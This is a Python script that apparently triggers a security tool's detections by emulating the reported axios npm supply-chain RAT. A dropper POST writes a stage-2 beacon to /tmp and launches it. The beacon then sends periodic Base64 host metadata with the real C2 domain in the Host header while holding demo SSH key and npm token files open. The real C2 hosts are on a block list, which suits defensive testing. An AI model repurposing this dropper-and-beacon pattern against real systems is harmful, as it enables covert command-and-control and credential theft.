#!/usr/bin/env python3
"""
Trigger npm supply chain RAT beacon detection.

Real threat: axios 1.14.1 / 0.30.4 npm compromise (31 March 2026) --
a compromised maintainer account published malicious versions that
introduced a phantom dependency (plain-crypto-js 4.2.1) whose
postinstall hook downloaded a platform-specific RAT via HTTP POST to
a C2 server on TCP/8000.  The second-stage payload was written to a
temp path (/tmp/ld.py on Linux, a cache directory on macOS) and
executed in the background.  The RAT beacons every ~60 seconds with
Base64-encoded JSON metadata using a hardcoded legacy IE User-Agent.

This script reproduces the two-phase attack:
  Phase 1 (dropper): writes the beacon script into /tmp (state_dir),
                     sends a single platform-discriminator POST, then
                     launches the beacon from /tmp as a child process
  Phase 2 (beacon):  the /tmp child sends periodic HTTP POST with
                     Base64(JSON) body + legacy IE UA while holding
                     credential files open

The beacon child runs from /tmp so that flodbadd's L7 attribution
shows parent_process_path under /tmp -- matching the real malware's
execution pattern and triggering sandbox_exploitation if applicable.

Detection path:
  flodbadd iForest  ->  session marked "anomalous" (periodic beacon)
  L7 open_files contains sensitive path  ->  token_exfiltration finding
  L7 parent_process_path under /tmp  ->  sandbox_exploitation finding
  divergence engine  ->  undeclared destination not in behavioral model

IOCs (defanged): sfrclak[.]com / 142.11.206.73 -- BLOCKED by this script.

Reference: StepSecurity incident report (31 Mar 2026)

Cross-platform: macOS, Linux, Windows.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import platform
import signal
import socket
import subprocess
import sys
import time
from pathlib import Path

from _common import (
    AGENT_TYPE_ARG_HELP,
    file_prefix_for,
    resolve_agent_type,
    state_dir_for,
    upper_prefix_for,
)

PID_FILE = "npm_rat_beacon.pid"
CREATED_MARKER = "npm_rat_beacon.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 63173

BLOCKED_HOSTS = {
    "sfrclak.com",
    "142.11.206.73",
}

DEFAULT_UA = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"

PLATFORM_DISCRIMINATORS = {
    "Darwin": "product0",
    "Windows": "product1",
    "Linux": "product2",
}

KEEP_RUNNING = True

# Stage-2 beacon script written to /tmp and executed from there,
# matching the real malware's behavior of writing /tmp/ld.py and
# running it with nohup.
STAGE2_SCRIPT = r'''#!/usr/bin/env python3
"""Stage-2 RAT beacon -- written to /tmp by the dropper, executed from there."""
import base64, json, os, platform, signal, socket, sys, time
from pathlib import Path

UA = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"
KEEP = True

def _sig(s, f):
    global KEEP
    KEEP = False

def open_files(paths):
    handles = []
    for p in paths:
        p = Path(p).expanduser()
        if p.exists():
            h = p.open("rb"); h.read(1); h.seek(0)
            handles.append(h)
    return handles

def b64_beacon(seq):
    payload = {"vid": f"test-{os.getpid()}", "ts": time.time(), "seq": seq,
               "host": {"hostname": socket.gethostname(), "os": platform.system(),
                        "release": platform.release(), "arch": platform.machine()},
               "telemetry": {"heartbeat": True, "note": "TEST_EMULATION_ONLY"}}
    return base64.b64encode(json.dumps(payload, separators=(",",":")).encode()).decode()

def build_request(seq):
    body = b64_beacon(seq).encode()
    return (f"POST /beacon HTTP/1.1\r\nHost: sfrclak.com\r\n"
            f"User-Agent: {UA}\r\nContent-Type: application/octet-stream\r\n"
            f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body

def main():
    target_ip, port, interval, duration = sys.argv[1], int(sys.argv[2]), float(sys.argv[3]), float(sys.argv[4])
    open_paths = sys.argv[5:]
    signal.signal(signal.SIGINT, _sig); signal.signal(signal.SIGTERM, _sig)
    handles = open_files(open_paths)
    print(f"stage2_beacon active  pid={os.getpid()}  target={target_ip}:{port}", flush=True)
    sock, seq, started = None, 0, time.monotonic()
    try:
        while KEEP:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break
            if sock is None:
                try:
                    sock = socket.create_connection((target_ip, port), timeout=10.0)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    sock.settimeout(30.0)
                except OSError:
                    time.sleep(min(interval, 1.0)); continue
            seq += 1
            try:
                sock.sendall(build_request(seq))
            except OSError:
                try: sock.close()
                except OSError: pass
                sock = None; time.sleep(min(interval, 0.5)); continue
            try:
                sock.setblocking(False)
                try: sock.recv(65536)
                except (BlockingIOError, OSError): pass
                finally: sock.setblocking(True); sock.settimeout(30.0)
            except OSError: pass
            time.sleep(interval)
    finally:
        if sock:
            try: sock.close()
            except OSError: pass
        for h in handles:
            try: h.close()
            except OSError: pass

if __name__ == "__main__":
    raise SystemExit(main() or 0)
'''


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger npm supply chain RAT beacon detection by writing "
                    "a stage-2 beacon to /tmp and launching it from there, "
                    "reproducing the axios 1.14.1 dropper pattern."
    )
    p.add_argument("--agent-type", default=None, help=AGENT_TYPE_ARG_HELP)
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=10.0,
                   help="Seconds between beacon requests (real RAT uses 60s; default 10s for demo)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return path
    path.write_text(content, encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, path)
    return path


def validate_target(host: str, ip: str) -> None:
    for blocked in BLOCKED_HOSTS:
        if blocked in host or blocked in ip:
            raise SystemExit(f"Refusing to target blocked host: {blocked}")


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def send_dropper_post(target_ip: str, port: int) -> None:
    """Phase 1: send the platform-discriminator POST (like the postinstall hook)."""
    discriminator = PLATFORM_DISCRIMINATORS.get(platform.system(), "product2")
    body = discriminator.encode()
    request = (
        f"POST /1337 HTTP/1.1\r\n"
        f"Host: sfrclak.com\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        sock = socket.create_connection((target_ip, port), timeout=10.0)
        sock.sendall(request)
        sock.close()
        print(f"  phase1_dropper sent discriminator={discriminator}")
    except OSError as e:
        print(f"  phase1_dropper failed (non-fatal): {e}")
    sys.stdout.flush()


def write_stage2(state_dir: Path) -> Path:
    """Write the stage-2 beacon script to /tmp (state_dir), mimicking the
    real dropper writing /tmp/ld.py on Linux."""
    stage2_path = state_dir / "ld.py"
    stage2_path.write_text(STAGE2_SCRIPT, encoding="utf-8")
    stage2_path.chmod(0o755)
    record_created(state_dir, stage2_path)
    return stage2_path


def create_launcher(stage2_path: Path, state_dir: Path) -> Path:
    """Create a shell wrapper in /tmp that runs the stage-2, so the beacon
    process has /tmp parent lineage in flodbadd's L7 attribution."""
    launcher = state_dir / "npm_rat_launcher.sh"
    launcher.write_text(
        f'#!/bin/sh\npython3 "{stage2_path}" "$@"\n',
        encoding="utf-8",
    )
    launcher.chmod(0o755)
    record_created(state_dir, launcher)
    return launcher


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    validate_target(args.target_host, args.target_ip)

    ssh_key = ensure_demo_sensitive_file(
        Path(f"~/.ssh/{pfx}_npm_rat_key"),
        f"-----BEGIN OPENSSH PRIVATE KEY-----\n{upfx}_NPM_RAT_BEACON\n-----END OPENSSH PRIVATE KEY-----\n",
        state_dir,
    )
    npmrc = ensure_demo_sensitive_file(
        Path(f"~/.npmrc_{pfx}_rat"),
        f"//registry.npmjs.org/:_authToken=npm_{pfx}_RAT_DEMO_TOKEN\n",
        state_dir,
    )

    open_paths = [ssh_key, npmrc]
    psk_path = Path("~/.edamame_psk").expanduser()
    if psk_path.exists():
        open_paths.append(psk_path)

    target_ip = resolve_target(args.target_ip, args.target_host)
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 1.0)

    print(f"trigger_npm_rat_beacon.py active  pid={os.getpid()}")
    for p in open_paths:
        print(f"  open_path={p}")
    print(f"  target={target_ip}:{args.target_port} host={args.target_host}")
    print("  threat=axios 1.14.1/0.30.4 npm supply chain RAT (31 March 2026)")
    print("  reference=StepSecurity incident report")
    print("  detection=token_exfiltration + sandbox_exploitation + divergence")
    print(f"  mode=Phase1(dropper POST) + Phase2(stage-2 beacon from /tmp every {interval}s)")
    print(f"  user_agent={DEFAULT_UA}")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    # Phase 1: dropper POST
    send_dropper_post(target_ip, args.target_port)

    # Write stage-2 to /tmp (like the real dropper writing /tmp/ld.py)
    stage2_path = write_stage2(state_dir)
    launcher = create_launcher(stage2_path, state_dir)
    print(f"  stage2_written={stage2_path}")
    print(f"  launcher={launcher}")
    sys.stdout.flush()

    # Phase 2: launch the beacon child from /tmp
    pid_file = state_dir / PID_FILE
    child_args = [
        str(launcher),
        target_ip,
        str(args.target_port),
        str(interval),
        str(duration),
    ] + [str(p) for p in open_paths]

    proc = subprocess.Popen(
        child_args,
        stdout=sys.stdout,
        stderr=sys.stderr,
    )
    pid_file.write_text(f"{proc.pid}\n", encoding="utf-8")
    print(f"  stage2_launched  child_pid={proc.pid}")
    sys.stdout.flush()

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    started = time.monotonic()
    try:
        while KEEP_RUNNING:
            ret = proc.poll()
            if ret is not None:
                return ret
            if duration > 0 and (time.monotonic() - started) >= duration:
                proc.terminate()
                proc.wait(timeout=5)
                return 0
            time.sleep(0.5)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
